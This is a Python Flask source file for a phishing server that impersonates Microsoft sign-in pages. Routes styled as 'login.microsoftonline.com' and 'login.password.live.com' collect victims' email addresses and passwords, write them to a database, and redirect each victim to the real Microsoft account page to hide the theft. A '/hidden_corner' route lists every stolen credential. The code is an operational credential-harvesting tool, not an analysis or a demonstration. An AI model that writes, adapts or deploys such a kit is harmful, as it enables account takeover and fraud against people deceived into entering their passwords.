from flask import Flask, jsonify, render_template, request, url_for, redirect, flash, send_from_directory, session
from flask_sqlalchemy import SQLAlchemy
from flask_login import UserMixin
from sql import create_data_table, insert_initial_data, show_all
from datetime import datetime
from flask_session import Session
from datetime import datetime, timedelta

app = Flask(__name__)

app.secret_key = '555asdfl'
app.config["SESSION_PERMANENT"] = False
app.config["SESSION_TYPE"] = "filesystem"
app.permanent_session_lifetime = timedelta(minutes=30)
Session(app)


# class User(UserMixin, db.Model):
#     id = db.Column(db.Integer, primary_key=True)
#     email = db.Column(db.String(100))
#     password = db.Column(db.String(1000))
# db.create_all()

@app.route("/login.microsoftonline.com", methods=['GET', 'POST'])
def mail():
  print('ghghg')
  if request.method == 'POST':
    session["email"] = request.form.get("email")
    email = request.form.get("email")
    print(session)
  
    return redirect(url_for('password', email = email))
  return render_template ('email.html')

@app.route("/login.password.live.com", methods=['GET', 'POST'])
def password():
  print('sec')
  print(request.args)
  email = session.get('email')
  
  print(email)
  if request.method == 'POST':
    session['password'] = request.form.get('password')

    password = request.form.get('password')
    date = datetime.now()
    print(f'p {session}')
    insert_initial_data(date, email, password)
    return redirect('https://account.microsoft.com/account/Account')
    

  return render_template ('password.html', email = email)

@app.route("/error", methods=['GET', 'POST'])
def error():
  print(request.args)
  print(session)
  print('error')
  return render_template('error.html')

@app.route("/others", methods=['GET', 'POST'])
def other():
  print('yes')
  if request.method == 'POST':
    name=request.form.get('email')
    print('Yep')
  return render_template('others.html')

@app.route("/hidden_corner", methods=['GET'])
def slide():
  return show_all()




if __name__ == "__main__":
  app.run()